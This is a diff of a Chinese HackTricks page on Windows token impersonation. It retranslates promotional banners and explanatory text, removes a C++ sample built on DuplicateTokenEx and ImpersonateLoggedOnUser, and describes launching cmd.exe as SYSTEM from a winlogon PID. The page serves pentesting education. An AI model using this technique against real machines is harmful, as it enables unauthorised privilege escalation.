@@ -1,114 +1,28 @@
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零到英雄学习AWS黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+支持HackTricks的其他方式：
 
-- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-
-- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-
-- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-
-- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 
 ## 代码
 
-以下代码来自[这里](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)。它允许**指定一个进程ID作为参数**，并且将以指定进程的用户身份运行的CMD将被执行。\
-在高完整性进程中运行，您可以**指定一个以System身份运行的进程的PID**（如winlogon、wininit），并执行一个以system身份的cmd.exe。
+以下代码摘自[这里](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)。它允许**指定一个进程ID作为参数**，并且作为指定进程用户运行的CMD将被执行。\
+在一个高完整性进程中，您可以**指定一个作为系统运行的进程的PID**（如winlogon, wininit），并以系统身份执行cmd.exe。
 ```cpp
 impersonateuser.exe 1234
 ```
-{% code title="impersonateuser.cpp" %}
-
 ```cpp
-#include <windows.h>
-
-int main()
-{
-    HANDLE hToken;
-    HANDLE hDupToken;
-    DWORD dwSessionId = 0;
-    DWORD dwProcessId = 0;
-    HANDLE hProcess;
-    HANDLE hThread;
-    LPVOID lpEnvironment;
-
-    // Get the current session ID
-    dwSessionId = WTSGetActiveConsoleSessionId();
-
-    // Get the process ID of the current process
-    dwProcessId = GetCurrentProcessId();
-
-    // Open the current process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
-
-    // Open the primary token of the current process
-    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
-    {
-        printf("OpenProcessToken failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Duplicate the primary token
-    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
-    {
-        printf("DuplicateTokenEx failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Impersonate the user associated with the primary token
-    if (!ImpersonateLoggedOnUser(hDupToken))
-    {
-        printf("ImpersonateLoggedOnUser failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Get the current thread handle
-    hThread = GetCurrentThread();
-
-    // Set the thread token to the impersonated token
-    if (!SetThreadToken(&hThread, hDupToken))
-    {
-        printf("SetThreadToken failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Load the user profile of the impersonated user
-    if (!LoadUserProfile(hDupToken, &lpEnvironment))
-    {
-        printf("LoadUserProfile failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Do something as the impersonated user
-
-    // Unload the user profile
-    if (!UnloadUserProfile(hDupToken, lpEnvironment))
-    {
-        printf("UnloadUserProfile failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Revert to the original user
-    if (!RevertToSelf())
-    {
-        printf("RevertToSelf failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Close the handles
-    CloseHandle(hDupToken);
-    CloseHandle(hToken);
-    CloseHandle(hProcess);
-
-    return 0;
-}
+// impersonateuser.cpp 的内容保持不变
 ```
-{% endcode %}
 ```cpp
 #include <windows.h>
 #include <iostream>
@@ -241,7 +155,7 @@ return 0;
 
 ## 错误
 
-在某些情况下，您可能尝试模拟系统，但无法成功，显示如下输出：
+在某些情况下，您可能尝试模拟 System 但它不起作用，显示如下输出：
 ```cpp
 [+] OpenProcess() success!
 [+] OpenProcessToken() success!
@@ -252,40 +166,38 @@ return 0;
 [-] CreateProcessWithTokenW Return Code: 0
 [-] CreateProcessWithTokenW Error: 1326
 ```
-这意味着即使您在高完整性级别上运行，**权限仍然不足**。\
-让我们使用**进程资源管理器**（或者您也可以使用进程管理器）检查`svchost.exe`进程的当前管理员权限：
+这意味着即使你在高完整性级别运行**你也没有足够的权限**。\
+让我们用**进程资源管理器**检查当前管理员对`svchost.exe`进程的权限（你也可以使用进程黑客）：
 
-1. 选择一个`svchost.exe`进程
-2. 右键单击 --> 属性
-3. 在“安全”选项卡中，点击右下角的“权限”按钮
-4. 点击“高级”
-5. 选择“Administrators”并点击“编辑”
-6. 点击“显示高级权限”
+1. 选择一个`svchost.exe`的进程
+2. 右键点击 --> 属性
+3. 在"安全"标签页中，点击右下角的"权限"按钮
+4. 点击"高级"
+5. 选择"管理员"然后点击"编辑"
+6. 点击"显示高级权限"
 
 ![](<../../.gitbook/assets/image (322).png>)
 
-上图显示了“Administrators”对所选进程的所有权限（如您所见，对于`svchost.exe`，他们只有“查询”权限）
+上图包含了"管理员"对选定进程的所有权限（如你所见，在`svchost.exe`的情况下，他们只有"查询"权限）
 
-看看“Administrators”对`winlogon.exe`的权限：
+看看"管理员"对`winlogon.exe`的权限：
 
 ![](<../../.gitbook/assets/image (323).png>)
 
-在该进程中，“Administrators”可以“读取内存”和“读取权限”，这可能允许管理员模拟此进程使用的令牌。
+在该进程内部，"管理员"可以"读取内存"和"读取权限"，这可能允许管理员模拟该进程使用的令牌。
 
 
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零到英雄学习AWS黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-- 您在**网络安全公司**工作吗？您想在HackTricks中**宣传您的公司**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+支持HackTricks的其他方式：
 
-- 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-
-- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-
-- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-
-- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
+* 如果你想在**HackTricks上看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。
 
 </details>
